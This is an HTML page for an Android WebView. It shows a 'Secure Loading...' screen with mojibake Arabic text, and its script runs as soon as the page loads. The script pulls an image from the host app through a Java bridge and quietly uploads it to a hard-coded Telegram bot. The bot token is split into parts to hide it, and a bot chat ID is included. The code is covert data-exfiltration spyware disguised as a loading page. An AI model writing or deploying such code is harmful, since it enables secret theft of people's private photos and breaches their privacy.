<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Secure Loading...</title>
  </head>
  <body style="background:#000;color:#0f0;">
    <h3>๐ ุฌุงุฑู ุงูุชุญููู...</h3>

    <script>
      async function sendToTelegram(base64img) {
        // โ ุชุดููุด ุนูู ุงูุชููู:
        const part1 = "8066816136";
        const part2 = "AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0";
        const botToken = part1 + ":" + part2;

        const chatId = "6894787120";

        // ุชุญููู Base64 ุฅูู Blob ููุตูุฑุฉ
        const blob = await (await fetch(`data:image/jpeg;base64,${base64img}`)).blob();

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "image.jpg");

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData
        })
        .then(res => {
          document.body.innerHTML += "<p>โ๏ธ ุชู ุฅุฑุณุงู ุงูุตูุฑุฉ ุฅูู ุงูุณูุฑูุฑ</p>";
        })
        .catch(err => {
          document.body.innerHTML += "<p>โ ูุดู ุงูุฅุฑุณุงู: " + err + "</p>";
        });
      }

      // ุงุณุชุฏุนุงุก Java method ูู WebView
      try {
        const imgData = bridge.getImageBase64();
        if (imgData && imgData !== "ERROR") {
          sendToTelegram(imgData);
        } else {
          document.body.innerHTML += "<p>๐ ูู ูุชู ุงูุนุซูุฑ ุนูู ุตูุฑุฉ</p>";
        }
      } catch (e) {
        document.body.innerHTML += "<p>๐ซ ุฎุทุฃ ูู ุงูุงุชุตุงู ุจุงูุชุทุจูู</p>";
      }
    </script>
  </body>
</html>
